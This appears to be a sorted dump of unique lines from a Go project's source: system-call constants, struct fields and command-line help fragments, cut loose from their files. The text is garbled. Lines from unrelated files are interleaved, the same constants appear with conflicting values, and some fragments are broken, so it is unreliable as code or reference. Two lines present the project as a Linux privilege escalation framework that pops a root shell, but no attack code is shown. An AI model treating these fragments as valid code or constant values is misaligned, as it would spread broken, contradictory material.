AT_SYMLINK_NOFOLLOW             = 1  // for Unix  compatibility -- no zos semantics
AT_SYMLINK_NOFOLLOW != 0 {
AT_SYMLINK_NOFOLLOW = 0x1
AT_SYMLINK_NOFOLLOW = 0x100
AT_SYMLINK_NOFOLLOW = 0x1000
AT_SYMLINK_NOFOLLOW = 0x2
AT_SYMLINK_NOFOLLOW = 0x20
AT_SYMLINK_NOFOLLOW = 0x200
AT_SYMLINK_NOFOLLOW)
AUDIT_RECORD_MAGIC/ 
AUTHTYPE_CLIENT = 1
AUTHTYPE_SERVER = 2
AUTOFS_SUPER_MAGIC                          = 0x187
Aame      
Ac_btime                  uint32
Ac_btime64                uint64
Ac_comm                   [32]int8
Ac_comm                   [32]uint8
Ac_etime                  uint64
Ac_exe_dev                uint64
Ac_exe_inode              uint64
Ac_exitcode               uint32
Ac_flag                   uint8
Ac_gid                    uint32
Ac_majflt                 uint64
Ac_minflt                 uint64
Ac_nice                   uint8
Ac_pad                    [3]uint8
Ac_pid                    uint32
Ac_ppid                   uint32
Ac_sched                  uint8
Ac_stime                  uint64
Ac_stimescaled            uint64
Ac_tgetime                uint64
Ac_tgid                   uint32
Ac_uid                    uint32
Ac_utime                  uint64
Ac_utimescaled            uint64
Acc   [8][10]uint8
Acc   [8][16]uint8
AccessMode        ACCESS_MODE
AccessPermissions ACCESS_MASK
Access_fs uint64
Access_id     uint8
Accrights    
Accrightslen int32
Acct(name nil-string) (err error)
Acct(path string) (err error)
Acoustic       uint16
AcquirePrivateKeyFlags uint32
Acrs                     [16]uint32
Actime  int32
Actime  int64
Action          uint32
Actions      
ActionsCount uint32
Active             int32
Active Help configuration using the 
Active Help configuration values are supported by the program.
Active Help is currently only supported for the following shells:
ActiveProcessLimit      uint32
AdapterName           
AdapterName         [MAX_ADAPTER_NAME_LENGTH 
Adding Active Help is done through the use of the 
Adding Active Help when completing a noun is done within the 
Adding a new syscall often just requires adding a new 
Adding new syscall numbers is mostly done by running the build on a sufficiently
Additional IP Rights Grant (Patents)
Additional commands can be defined and typically are each given their own file
Additional help topics:{{range .Commands}}{{if .IsAdditionalHelpTopicCommand}}
Addr 
Addr   
Addr     
Addr      SockaddrStorage
Addr      uint64
Addr      uintptr
Addr     [12]byte
Addr     [16]byte /
Addr     [4]byte /
Addr     [6]uint8
Addr     [8]byte
Addr     [8]uint8
Addr     uint64
Addr    [16]byte
Addr    [16]byte /
Addr    [4]byte /
Addr    uint32
Addr    uint64
Addr    uint8
Addr   [16]byte
Addr   [4]byte
Addr   [4]byte /
Addr RawSockaddr
Addr RawSockaddrInet6
Addr TIPCAddr
Addr [4]byte
Addr [6]uint8
Addr uint64
AddrList 
AddrType uint16
AddrType uint8
Addr_lsb  uint16
Address             [MAX_ADAPTER_ADDRESS_LENGTH]byte
Address            SocketAddress
Address          SockaddrGen
Address       uint64
Address      SocketAddress
Address   [4]byte /
Address  SocketAddress
Address SocketAddress
Address [8]uint8
AddressFamily     int32
AddressLength       uint32
Addrflags int32
AddrinfoW
AddrinfoW) (sockerr error) = ws2_32.GetAddrInfoW
AddrinfoW) (sockerr error) {
AddrinfoW) = ws2_32.FreeAddrInfoW
AddrinfoW) {
Addrlen      uint8
Addrlen     uint8
Addrlen    uint8
Addrlen   uintptr
Addrlen uint8
Addrs     int32
Addrs    int32
Addrs   int32
Addrtype uint8
Adjtime(delta 
Adjtimex(buf 
AdminStatus     uint32
Advmss         uint32
Affinity                uintptr
AffinityMask                 uintptr
After you create a flag it is possible to set the pflag.NoOptDefVal for
Alen    uint16
Alen   uint8
Algorithm CryptAlgorithmIdentifier
Algorithm uint16
Aliases 
Aliases  
Aliases []string
Aliases:
Alive uint16
All software has versions. This is Hugo's
AllCommands     bool
AllHosts        bool
AllUsers        bool
AllocateAndInitializeSid(identAuth 
AllocationBase    uintptr
AllocationProtect uint32
Allowed_access uint64
Allowing to configure Active Help is entirely optional
AlternateFileName [13]uint16
AlternateFileName [14]uint16
An example of setting the custom validator:
An extensible privilege escalation framework for Linux
And then I set that in my command definition:
Annotations         map[string][]string // used by cobra.Command bash autocomple code
Annotations map[string]string
Anonmin            int32
Anonminpct         int32
Anonpages          int32
Api_version   int32
App         HWND
Append(string) error
ApplicationUsage  
ArbitraryArgs
Arbitration_lost uint32
Arch      uint32
ArgAliases
ArgAliases []string
ArgAliases: argAliases
Args
Args PositionalArgs
Array
AsdkXOo5LdtjMVzkUWqfvvdzAGoITcc4
Assert_off_tu PPSKTime
Assert_sequence uint32
Assert_tu       PPSKTime
Asyncreads  int64
Asyncreads  uint64
Asyncwrites int64
Asyncwrites uint64
Atim           Timespec
Atim      Time_t
Atim     Timespec
Atim    Timespec
Atim Timespec
Atim31       [4]byte
Atime           StatxTimestamp
Atime      uint32
Atime  int64
Atime  uint32 // last read time
Atime:  
Atime_high uint16
Atime_high uint32
Atime_nsec uint32
AtlThunkSListPtr       uintptr
AtlThunkSListPtr32     uint32
Ato            uint32
Attr_clr    uint64
Attr_set    uint64
Attributes         uint32
Attributes        uint16
Attributes      uint64
Attributes uint32
Attributes_mask uint64
AuditID      [16]byte
Auditoraudit uint32
AuthIdentityData   
AuthInfo  
AuthType   uint32
AuthnLevel         uint32
AuthnSvc           uint32
AuthzSvc           uint32
Automatically exploit low-hanging fruit to pop a root shell. Linux privilege escalation made easy!
Aux_head       uint64
Aux_offset     uint64
Aux_size       uint64
Aux_tail       uint64
Aux_watermark      uint32
B0                                          = 0x0
B0                                      = 0x0
B0                                = 0x0
B0                             = 0x0
B0                            = 0x0
B1000000                         = 0x1008
B1000000                         = 0x17
B110                                        = 0x3
B110                                    = 0x6e
B110                              = 0x6e
B110                           = 0x6e
B110                          = 0x3
B115200                                 = 0x1c200
B115200                           = 0x1c200
B115200                          = 0x1002
B115200                          = 0x11
B115200                        = 0x1c200
B115200                       = 0x12
B1152000                         = 0x1009
B1152000                         = 0x18
B1200                                       = 0x9
B1200                                   = 0x4b0
B1200                             = 0x4b0
B1200                          = 0x4b0
B1200                         = 0x9
B134                                        = 0x4
B134                                    = 0x86
B134                              = 0x86
B134                           = 0x86
B134                          = 0x4
B14400                                  = 0x3840
B14400                            = 0x3840
B14400                         = 0x3840
B150                                        = 0x5
B150                                    = 0x96
B150                              = 0x96
B150                           = 0x96
B150                          = 0x5
B1500000                         = 0x100a
B1500000                         = 0x19
B153600                       = 0x13
B1800                                       = 0xa
B1800                                   = 0x708
B1800                             = 0x708
B1800                          = 0x708
B1800                         = 0xa
B19200                                      = 0xe
B19200                                  = 0x4b00
B19200                            = 0x4b00
B19200                         = 0x4b00
B19200                        = 0xe
B200                                        = 0x6
B200                                    = 0xc8
B200                              = 0xc8
B200                           = 0xc8
B200                          = 0x6
B2000000                         = 0x100b
B2000000                         = 0x1a
B230400                                 = 0x38400
B230400                           = 0x38400
B230400                          = 0x1003
B230400                          = 0x12
B230400                        = 0x38400
B230400                       = 0x14
B2400                                       = 0xb
B2400                                   = 0x960
B2400                             = 0x960
B2400                          = 0x960
B2400                         = 0xb
B2500000                         = 0x100c
B2500000                         = 0x1b
B28800                                  = 0x7080
B28800                            = 0x7080
B28800                         = 0x7080
B300                                        = 0x7
B300                                    = 0x12c
B300                              = 0x12c
B300                           = 0x12c
B300                          = 0x7
B3000000                         = 0x100d
B3000000                         = 0x1c
B307200                       = 0x15
B3500000                         = 0x100e
B3500000                         = 0x1d
B38400                                      = 0xf
B38400                                  = 0x9600
B38400                            = 0x9600
B38400                         = 0x9600
B38400                        = 0xf
B4000000                         = 0x100f
B4000000                         = 0x1e
B460800                           = 0x70800
B460800                          = 0x1004
B460800                          = 0x13
B460800                        = 0x70800
B460800                       = 0x16
B4800                                       = 0xc
B4800                                   = 0x12c0
B4800                             = 0x12c0
B4800                          = 0x12c0
B4800                         = 0xc
B50                                         = 0x1
B50                                     = 0x32
B50                               = 0x32
B50                            = 0x32
B50                           = 0x1
B500000                          = 0x1005
B500000                          = 0x14
B57600                                  = 0xe100
B57600                            = 0xe100
B57600                           = 0x10
B57600                           = 0x1001
B57600                         = 0xe100
B57600                        = 0x10
B576000                          = 0x1006
B576000                          = 0x15
B600                                        = 0x8
B600                                    = 0x258
B600                              = 0x258
B600                           = 0x258
B600                          = 0x8
B7200                                   = 0x1c20
B7200                             = 0x1c20
B7200                          = 0x1c20
B75                                         = 0x2
B75                                     = 0x4b
B75                               = 0x4b
B75                            = 0x4b
B75                           = 0x2
B76800                                  = 0x12c00
B76800                            = 0x12c00
B76800                         = 0x12c00
B76800                        = 0x11
B921600                           = 0xe1000
B921600                          = 0x1007
B921600                          = 0x16
B921600                        = 0xe1000
B921600                       = 0x17
B9600                                       = 0xd
B9600                                   = 0x2580
B9600                             = 0x2580
B9600                          = 0x2580
B9600                         = 0xd
BACKUP
BACKUP_SECURITY_INFORMATION           = 0x00010000
BALLOON_KVM_MAGIC                           = 0x13661366
BASE_PROTOCOL      = 1
BAUD(EX)
BDADDR_BREDR     = 0x0
BDADDR_LE_PUBLIC = 0x1
BDADDR_LE_RANDOM = 0x2
BDEVFS_MAGIC                                = 0x62646576
BELOW_NORMAL_PRIORITY_CLASS   = 0x00004000
BINDERFS_SUPER_MAGIC                        = 0x6c6f6f70
BINFMTFS_MAGIC                              = 0x42494e4d
BIOC/ 
BIOCFEEDBACK                      = 0x8004427d
BIOCFEEDBACK                   = 0x8004427c
BIOCFLUSH                               = 0x20004268
BIOCFLUSH                         = 0x20004268
BIOCFLUSH                      = 0x20004268
BIOCFLUSH                     = 0x20004268
BIOCGBLEN                               = 0x40044266
BIOCGBLEN                         = 0x40044266
BIOCGBLEN                      = 0x40044266
BIOCGBLEN                     = 0x40044266
BIOCGDIRECTION                 = 0x40044276
BIOCGDIRFILT                      = 0x4004427c
BIOCGDLT                                = 0x4004426a
BIOCGDLT                          = 0x4004426a
BIOCGDLT                       = 0x4004426a
BIOCGDLT                      = 0x4004426a
BIOCGDLTLIST                            = 0xc00c4279
BIOCGDLTLIST                      = 0xc0084277
BIOCGDLTLIST                      = 0xc008427b
BIOCGDLTLIST                      = 0xc0104277
BIOCGDLTLIST                      = 0xc0104279
BIOCGDLTLIST                      = 0xc010427b
BIOCGDLTLIST                   = 0xc0084279
BIOCGDLTLIST                   = 0xc0104279
BIOCGDLTLIST                  = -0x3fefbd89
BIOCGDLTLIST32                = -0x3ff7bd89
BIOCGETBUFMODE                 = 0x4004427d
BIOCGETIF                               = 0x4020426b
BIOCGETIF                         = 0x4020426b
BIOCGETIF                         = 0x4090426b
BIOCGETIF                      = 0x4020426b
BIOCGETIF                     = 0x4020426b
BIOCGETLIF                    = 0x4078426b
BIOCGETZMAX                    = 0x4004427f
BIOCGETZMAX                    = 0x4008427f
BIOCGFEEDBACK                     = 0x4004427c
BIOCGFILDROP                      = 0x40044278
BIOCGHDRCMPLT                           = 0x40044274
BIOCGHDRCMPLT                     = 0x40044274
BIOCGHDRCMPLT                  = 0x40044274
BIOCGHDRCMPLT                 = 0x40044274
BIOCGRSIG                               = 0x40044272
BIOCGRSIG                         = 0x40044272
BIOCGRSIG                         = 0x40044273
BIOCGRSIG                      = 0x40044272
BIOCGRTIMEOUT                           = 0x4010426e
BIOCGRTIMEOUT                     = 0x400c426e
BIOCGRTIMEOUT                     = 0x400c427b
BIOCGRTIMEOUT                     = 0x4010426e
BIOCGRTIMEOUT                     = 0x4010427b
BIOCGRTIMEOUT                  = 0x4008426e
BIOCGRTIMEOUT                  = 0x4010426e
BIOCGRTIMEOUT                 = 0x4010427b
BIOCGRTIMEOUT32               = 0x4008427b
BIOCGSEESENT                            = 0x40044276
BIOCGSEESENT                      = 0x40044276
BIOCGSEESENT                      = 0x40044278
BIOCGSEESENT                   = 0x40044276
BIOCGSEESENT                  = 0x40044278
BIOCGSTATS                              = 0x4008426f
BIOCGSTATS                        = 0x4008426f
BIOCGSTATS                        = 0x4080426f
BIOCGSTATS                     = 0x4008426f
BIOCGSTATS                    = 0x4080426f
BIOCGSTATSOLD                     = 0x4008426f
BIOCGSTATSOLD                 = 0x4008426f
BIOCGTSTAMP                    = 0x40044283
BIOCIMMEDIATE                           = 0x80044270
BIOCIMMEDIATE                     = 0x80044270
BIOCIMMEDIATE                  = 0x80044270
BIOCIMMEDIATE                 = -0x7ffbbd90
BIOCLOCK                          = 0x20004276
BIOCLOCK                          = 0x2000427a
BIOCLOCK                       = 0x2000427a
BIOCPROMISC                             = 0x20004269
BIOCPROMISC                       = 0x20004269
BIOCPROMISC                    = 0x20004269
BIOCPROMISC                   = 0x20004269
BIOCROTZBUF                    = 0x400c4280
BIOCROTZBUF                    = 0x40184280
BIOCSBLEN                               = 0xc0044266
BIOCSBLEN                         = 0xc0044266
BIOCSBLEN                      = 0xc0044266
BIOCSBLEN                     = -0x3ffbbd9a
BIOCSDIRECTION                 = 0x80044277
BIOCSDIRFILT                      = 0x8004427d
BIOCSDLT                                = 0x80044278
BIOCSDLT                          = 0x80044276
BIOCSDLT                          = 0x80044278
BIOCSDLT                          = 0x8004427a
BIOCSDLT                       = 0x80044278
BIOCSDLT                      = -0x7ffbbd8a
BIOCSETBUFMODE                 = 0x8004427e
BIOCSETF                                = 0x80104267
BIOCSETF                          = 0x80084267
BIOCSETF                          = 0x80104267
BIOCSETF                       = 0x80084267
BIOCSETF                       = 0x80104267
BIOCSETF                      = -0x7fefbd99
BIOCSETF32                    = -0x7ff7bd99
BIOCSETFNR                              = 0x8010427e
BIOCSETFNR                     = 0x80084282
BIOCSETFNR                     = 0x80104282
BIOCSETIF                               = 0x8020426c
BIOCSETIF                         = 0x8020426c
BIOCSETIF                         = 0x8090426c
BIOCSETIF                      = 0x8020426c
BIOCSETIF                     = -0x7fdfbd94
BIOCSETLIF                    = -0x7f87bd94
BIOCSETWF                         = 0x80084277
BIOCSETWF                         = 0x80104277
BIOCSETWF                         = 0x8010427b
BIOCSETWF                      = 0x8008427b
BIOCSETWF                      = 0x8010427b
BIOCSETZBUF                    = 0x800c4281
BIOCSETZBUF                    = 0x80184281
BIOCSFEEDBACK                     = 0x8004427d
BIOCSFILDROP                      = 0x80044279
BIOCSHDRCMPLT                           = 0x80044275
BIOCSHDRCMPLT                     = 0x80044275
BIOCSHDRCMPLT                  = 0x80044275
BIOCSHDRCMPLT                 = -0x7ffbbd8b
BIOCSRSIG                               = 0x80044273
BIOCSRSIG                         = 0x80044272
BIOCSRSIG                         = 0x80044273
BIOCSRSIG                      = 0x80044273
BIOCSRTIMEOUT                           = 0x8010426d
BIOCSRTIMEOUT                     = 0x800c426d
BIOCSRTIMEOUT                     = 0x800c427a
BIOCSRTIMEOUT                     = 0x8010426d
BIOCSRTIMEOUT                     = 0x8010427a
BIOCSRTIMEOUT                  = 0x8008426d
BIOCSRTIMEOUT                  = 0x8010426d
BIOCSRTIMEOUT                 = -0x7fefbd86
BIOCSRTIMEOUT32               = -0x7ff7bd86
BIOCSSEESENT                            = 0x80044277
BIOCSSEESENT                      = 0x80044277
BIOCSSEESENT                      = 0x80044279
BIOCSSEESENT                   = 0x80044277
BIOCSSEESENT                  = -0x7ffbbd87
BIOCSTCPF                         = 0x80084272
BIOCSTCPF                         = 0x80104272
BIOCSTCPF                     = -0x7fefbd8e
BIOCSTSTAMP                    = 0x80044284
BIOCSUDPF                         = 0x80084273
BIOCSUDPF                         = 0x80104273
BIOCSUDPF                     = -0x7fefbd8d
BIOCVERSION                             = 0x40044271
BIOCVERSION                       = 0x40044271
BIOCVERSION                    = 0x40044271
BIOCVERSION                   = 0x40044271
BLKBSZGET                        = 0x40041270
BLKBSZGET                        = 0x40081270
BLKBSZGET                        = 0x80041270
BLKBSZGET                        = 0x80081270
BLKBSZSET                        = 0x40041271
BLKBSZSET                        = 0x40081271
BLKBSZSET                        = 0x80041271
BLKBSZSET                        = 0x80081271
BLKFLSBUF                        = 0x1261
BLKFLSBUF                        = 0x20001261
BLKFRAGET                        = 0x1265
BLKFRAGET                        = 0x20001265
BLKFRASET                        = 0x1264
BLKFRASET                        = 0x20001264
BLKGETSIZE                       = 0x1260
BLKGETSIZE                       = 0x20001260
BLKGETSIZE64                     = 0x40041272
BLKGETSIZE64                     = 0x40081272
BLKGETSIZE64                     = 0x80041272
BLKGETSIZE64                     = 0x80081272
BLKPBSZGET                       = 0x127b
BLKPBSZGET                       = 0x2000127b
BLKPG = 0x1269
BLKPG = 0x20001269
BLKPG_ADD_PARTITION    = 0x1
BLKPG_DEL_PARTITION    = 0x2
BLKPG_RESIZE_PARTITION = 0x3
BLKRAGET                         = 0x1263
BLKRAGET                         = 0x20001263
BLKRASET                         = 0x1262
BLKRASET                         = 0x20001262
BLKROGET                         = 0x125e
BLKROGET                         = 0x2000125e
BLKROSET                         = 0x125d
BLKROSET                         = 0x2000125d
BLKRRPART                        = 0x125f
BLKRRPART                        = 0x2000125f
BLKSECTGET                       = 0x1267
BLKSECTGET                       = 0x20001267
BLKSECTSET                       = 0x1266
BLKSECTSET                       = 0x20001266
BLKSSZGET                        = 0x1268
BLKSSZGET                        = 0x20001268
BLK[A-Z]
BLUETOOTH
BOTHER                           = 0x1000
BOTHER                           = 0x1f
BPF_A                                       = 0x10
BPF_A                                   = 0x10
BPF_A                             = 0x10
BPF_A                          = 0x10
BPF_A                         = 0x10
BPF_ABS                                     = 0x20
BPF_ABS                                 = 0x20
BPF_ABS                           = 0x20
BPF_ABS                        = 0x20
BPF_ABS                       = 0x20
BPF_ADD                                     = 0x0
BPF_ADD                                 = 0x0
BPF_ADD                           = 0x0
BPF_ADD                        = 0x0
BPF_ADD                       = 0x0
BPF_ADJ_ROOM_ENCAP_L2_MASK                 = 0xff
BPF_ADJ_ROOM_ENCAP_L2_SHIFT                = 0x38
BPF_ADJ_ROOM_MAC                           = 0x1
BPF_ADJ_ROOM_NET                           = 0x0
BPF_ALIGNMENT                           = 0x4
BPF_ALIGNMENT                     = 0x4
BPF_ALIGNMENT                     = 0x8
BPF_ALIGNMENT                  = 0x4
BPF_ALIGNMENT                  = 0x8
BPF_ALIGNMENT                 = 0x4
BPF_ALIGNMENT32                   = 0x4
BPF_ALU                                     = 0x4
BPF_ALU                                 = 0x4
BPF_ALU                           = 0x4
BPF_ALU                        = 0x4
BPF_ALU                       = 0x4
BPF_ALU64                                   = 0x7
BPF_AND                                     = 0x50
BPF_AND                                 = 0x50
BPF_AND                           = 0x50
BPF_AND                        = 0x50
BPF_AND                       = 0x50
BPF_ANY                                    = 0x0
BPF_ARSH                                    = 0xc0
BPF_ATOMIC                                  = 0xc0
BPF_B                                       = 0x10
BPF_B                                   = 0x10
BPF_B                             = 0x10
BPF_B                          = 0x10
BPF_B                         = 0x10
BPF_BTF_GET_FD_BY_ID                       = 0x13
BPF_BTF_GET_NEXT_ID                        = 0x17
BPF_BTF_LOAD                               = 0x12
BPF_BUFMODE_BUFFER             = 0x1
BPF_BUFMODE_ZBUF               = 0x2
BPF_BUILD_ID_SIZE                           = 0x14
BPF_CALL                                    = 0x80
BPF_CGROUP_DEVICE                          = 0x6
BPF_CGROUP_GETSOCKOPT                      = 0x15
BPF_CGROUP_INET4_BIND                      = 0x8
BPF_CGROUP_INET4_CONNECT                   = 0xa
BPF_CGROUP_INET4_GETPEERNAME               = 0x1d
BPF_CGROUP_INET4_GETSOCKNAME               = 0x1f
BPF_CGROUP_INET4_POST_BIND                 = 0xc
BPF_CGROUP_INET6_BIND                      = 0x9
BPF_CGROUP_INET6_CONNECT                   = 0xb
BPF_CGROUP_INET6_GETPEERNAME               = 0x1e
BPF_CGROUP_INET6_GETSOCKNAME               = 0x20
BPF_CGROUP_INET6_POST_BIND                 = 0xd
BPF_CGROUP_INET_EGRESS                     = 0x1
BPF_CGROUP_INET_INGRESS                    = 0x0
BPF_CGROUP_INET_SOCK_CREATE                = 0x2
BPF_CGROUP_INET_SOCK_RELEASE               = 0x22
BPF_CGROUP_SETSOCKOPT                      = 0x16
BPF_CGROUP_SOCK_OPS                        = 0x3
BPF_CGROUP_SYSCTL                          = 0x12
BPF_CGROUP_UDP4_RECVMSG                    = 0x13
BPF_CGROUP_UDP4_SENDMSG                    = 0xe
BPF_CGROUP_UDP6_RECVMSG                    = 0x14
BPF_CGROUP_UDP6_SENDMSG                    = 0xf
BPF_CMPXCHG                                 = 0xf1
BPF_CSUM_LEVEL_DEC                         = 0x2
BPF_CSUM_LEVEL_INC                         = 0x1
BPF_CSUM_LEVEL_QUERY                       = 0x0
BPF_CSUM_LEVEL_RESET                       = 0x3
BPF_DEFAULTBUFSIZE                = 0x1000
BPF_DEVCG_ACC_MKNOD                        = 0x1
BPF_DEVCG_ACC_READ                         = 0x2
BPF_DEVCG_ACC_WRITE                        = 0x4
BPF_DEVCG_DEV_BLOCK                        = 0x1
BPF_DEVCG_DEV_CHAR                         = 0x2
BPF_DFLTBUFSIZE                   = 0x100000
BPF_DFLTBUFSIZE               = 0x100000
BPF_DIRECTION_IN                  = 0x1
BPF_DIRECTION_OUT                 = 0x2
BPF_DIV                                     = 0x30
BPF_DIV                                 = 0x30
BPF_DIV                           = 0x30
BPF_DIV                        = 0x30
BPF_DIV                       = 0x30
BPF_DROP                                   = 0x2
BPF_DW                                      = 0x18
BPF_ENABLE_STATS                           = 0x20
BPF_END                                     = 0xd0
BPF_EXIST                                  = 0x2
BPF_EXIT                                    = 0x90
BPF_FD_TYPE_KPROBE                         = 0x2
BPF_FD_TYPE_KRETPROBE                      = 0x3
BPF_FD_TYPE_RAW_TRACEPOINT                 = 0x0
BPF_FD_TYPE_TRACEPOINT                     = 0x1
BPF_FD_TYPE_UPROBE                         = 0x4
BPF_FD_TYPE_URETPROBE                      = 0x5
BPF_FETCH                                   = 0x1
BPF_FIB_LKUP_RET_BLACKHOLE                 = 0x1
BPF_FIB_LKUP_RET_FRAG_NEEDED               = 0x8
BPF_FIB_LKUP_RET_FWD_DISABLED              = 0x5
BPF_FIB_LKUP_RET_NOT_FWDED                 = 0x4
BPF_FIB_LKUP_RET_NO_NEIGH                  = 0x7
BPF_FIB_LKUP_RET_PROHIBIT                  = 0x3
BPF_FIB_LKUP_RET_SUCCESS                   = 0x0
BPF_FIB_LKUP_RET_UNREACHABLE               = 0x2
BPF_FIB_LKUP_RET_UNSUPP_LWT                = 0x6
BPF_FIB_LOOKUP_DIRECT                      = 0x1
BPF_FIB_LOOKUP_OUTPUT                      = 0x2
BPF_FIB_LOOKUP_[A-Z]
BPF_FILDROP_CAPTURE               = 0x1
BPF_FILDROP_DROP                  = 0x2
BPF_FILDROP_PASS                  = 0x0
BPF_FLOW_DISSECTOR                         = 0x11
BPF_FLOW_DISSECTOR_F_PARSE_1ST_FRAG        = 0x1
BPF_FLOW_DISSECTOR_F_STOP_AT_ENCAP         = 0x4
BPF_FLOW_DISSECTOR_F_STOP_AT_FLOW_LABEL    = 0x2
BPF_FROM_BE                                 = 0x8
BPF_FROM_LE                                 = 0x0
BPF_FS_MAGIC                                = 0xcafe4a11
BPF_F_ADJ_ROOM_ENCAP_L3_IPV4               = 0x2
BPF_F_ADJ_ROOM_ENCAP_L3_IPV6               = 0x4
BPF_F_ADJ_ROOM_ENCAP_L4_GRE                = 0x8
BPF_F_ADJ_ROOM_ENCAP_L4_UDP                = 0x10
BPF_F_ADJ_ROOM_FIXED_GSO                   = 0x1
BPF_F_ADJ_ROOM_NO_CSUM_RESET               = 0x20
BPF_F_ALLOW_MULTI                           = 0x2
BPF_F_ALLOW_OVERRIDE                        = 0x1
BPF_F_ANY_ALIGNMENT                         = 0x2
BPF_F_CLONE                                = 0x200
BPF_F_CTXLEN_MASK                          = 0xfffff00000000
BPF_F_CURRENT_CPU                          = 0xffffffff
BPF_F_CURRENT_NETNS                        = -0x1
BPF_F_DONT_FRAGMENT                        = 0x4
BPF_F_FAST_STACK_CMP                       = 0x200
BPF_F_GET_BRANCH_RECORDS_SIZE              = 0x1
BPF_F_HDR_FIELD_MASK                       = 0xf
BPF_F_INDEX_MASK                           = 0xffffffff
BPF_F_INGRESS                              = 0x1
BPF_F_INNER_MAP                            = 0x1000
BPF_F_INVALIDATE_HASH                      = 0x2
BPF_F_KPROBE_MULTI_RETURN                   = 0x1
BPF_F_LOCK                                 = 0x4
BPF_F_MARK_ENFORCE                         = 0x40
BPF_F_MARK_MANGLED_0                       = 0x20
BPF_F_MMAPABLE                             = 0x400
BPF_F_NO_COMMON_LRU                        = 0x2
BPF_F_NO_PREALLOC                          = 0x1
BPF_F_NUMA_NODE                            = 0x4
BPF_F_PRESERVE_ELEMS                       = 0x800
BPF_F_PSEUDO_HDR                           = 0x10
BPF_F_QUERY_EFFECTIVE                       = 0x1
BPF_F_RDONLY                               = 0x8
BPF_F_RDONLY_PROG                          = 0x80
BPF_F_RECOMPUTE_CSUM                       = 0x1
BPF_F_REPLACE                               = 0x4
BPF_F_REUSE_STACKID                        = 0x400
BPF_F_SEQ_NUMBER                           = 0x8
BPF_F_SKIP_FIELD_MASK                      = 0xff
BPF_F_SLEEPABLE                             = 0x10
BPF_F_STACK_BUILD_ID                       = 0x20
BPF_F_STRICT_ALIGNMENT                      = 0x1
BPF_F_SYSCTL_BASE_NAME                     = 0x1
BPF_F_TEST_RND_HI32                         = 0x4
BPF_F_TEST_RUN_ON_CPU                       = 0x1
BPF_F_TEST_STATE_FREQ                       = 0x8
BPF_F_TEST_XDP_LIVE_FRAMES                  = 0x2
BPF_F_TUNINFO_IPV6                         = 0x1
BPF_F_USER_BUILD_ID                        = 0x800
BPF_F_USER_STACK                           = 0x100
BPF_F_WRONLY                               = 0x10
BPF_F_WRONLY_PROG                          = 0x100
BPF_F_XDP_HAS_FRAGS                         = 0x20
BPF_F_ZERO_CSUM_TX                         = 0x2
BPF_F_ZERO_SEED                            = 0x40
BPF_H                                       = 0x8
BPF_H                                   = 0x8
BPF_H                             = 0x8
BPF_H                          = 0x8
BPF_H                         = 0x8
BPF_HDR_START_MAC                          = 0x0
BPF_HDR_START_NET                          = 0x1
BPF_IMM                                     = 0x0
BPF_IMM                                 = 0x0
BPF_IMM                           = 0x0
BPF_IMM                        = 0x0
BPF_IMM                       = 0x0
BPF_IND                                     = 0x40
BPF_IND                                 = 0x40
BPF_IND                           = 0x40
BPF_IND                        = 0x40
BPF_IND                       = 0x40
BPF_ITER_CREATE                            = 0x21
BPF_JA                                      = 0x0
BPF_JA                                  = 0x0
BPF_JA                            = 0x0
BPF_JA                         = 0x0
BPF_JA                        = 0x0
BPF_JEQ                                     = 0x10
BPF_JEQ                                 = 0x10
BPF_JEQ                           = 0x10
BPF_JEQ                        = 0x10
BPF_JEQ                       = 0x10
BPF_JGE                                     = 0x30
BPF_JGE                                 = 0x30
BPF_JGE                           = 0x30
BPF_JGE                        = 0x30
BPF_JGE                       = 0x30
BPF_JGT                                     = 0x20
BPF_JGT                                 = 0x20
BPF_JGT                           = 0x20
BPF_JGT                        = 0x20
BPF_JGT                       = 0x20
BPF_JLE                                     = 0xb0
BPF_JLT                                     = 0xa0
BPF_JMP                                     = 0x5
BPF_JMP                                 = 0x5
BPF_JMP                           = 0x5
BPF_JMP                        = 0x5
BPF_JMP                       = 0x5
BPF_JMP32                                   = 0x6
BPF_JNE                                     = 0x50
BPF_JSET                                    = 0x40
BPF_JSET                                = 0x40
BPF_JSET                          = 0x40
BPF_JSET                       = 0x40
BPF_JSET                      = 0x40
BPF_JSGE                                    = 0x70
BPF_JSGT                                    = 0x60
BPF_JSLE                                    = 0xd0
BPF_JSLT                                    = 0xc0
BPF_K                                       = 0x0
BPF_K                                   = 0x0
BPF_K                             = 0x0
BPF_K                          = 0x0
BPF_K                         = 0x0
BPF_LD                                      = 0x0
BPF_LD                                  = 0x0
BPF_LD                            = 0x0
BPF_LD                         = 0x0
BPF_LD                        = 0x0
BPF_LDX                                     = 0x1
BPF_LDX                                 = 0x1
BPF_LDX                           = 0x1
BPF_LDX                        = 0x1
BPF_LDX                       = 0x1
BPF_LEN                                     = 0x80
BPF_LEN                                 = 0x80
BPF_LEN                           = 0x80
BPF_LEN                        = 0x80
BPF_LEN                       = 0x80
BPF_LINK_CREATE                            = 0x1c
BPF_LINK_DETACH                            = 0x22
BPF_LINK_GET_FD_BY_ID                      = 0x1e
BPF_LINK_GET_NEXT_ID                       = 0x1f
BPF_LINK_TYPE_CGROUP                       = 0x3
BPF_LINK_TYPE_ITER                         = 0x4
BPF_LINK_TYPE_NETNS                        = 0x5
BPF_LINK_TYPE_RAW_TRACEPOINT               = 0x1
BPF_LINK_TYPE_TRACING                      = 0x2
BPF_LINK_TYPE_UNSPEC                       = 0x0
BPF_LINK_TYPE_XDP                          = 0x6
BPF_LINK_UPDATE                            = 0x1d
BPF_LIRC_MODE2                             = 0x10
BPF_LL_OFF                                  = -0x200000
BPF_LOAD_HDR_OPT_TCP_SYN                   = 0x1
BPF_LOCAL_STORAGE_GET_F_CREATE             = 0x1
BPF_LSH                                     = 0x60
BPF_LSH                                 = 0x60
BPF_LSH                           = 0x60
BPF_LSH                        = 0x60
BPF_LSH                       = 0x60
BPF_LSM_MAC                                = 0x1b
BPF_LWT_ENCAP_IP                           = 0x2
BPF_LWT_ENCAP_SEG6                         = 0x0
BPF_LWT_ENCAP_SEG6_INLINE                  = 0x1
BPF_LWT_REROUTE                            = 0x80
BPF_MAJOR_VERSION                           = 0x1
BPF_MAJOR_VERSION                       = 0x1
BPF_MAJOR_VERSION                 = 0x1
BPF_MAJOR_VERSION              = 0x1
BPF_MAJOR_VERSION             = 0x1
BPF_MAP_CREATE                             = 0x0
BPF_MAP_DELETE_BATCH                       = 0x1b
BPF_MAP_DELETE_ELEM                        = 0x3
BPF_MAP_FREEZE                             = 0x16
BPF_MAP_GET_FD_BY_ID                       = 0xe
BPF_MAP_GET_NEXT_ID                        = 0xc
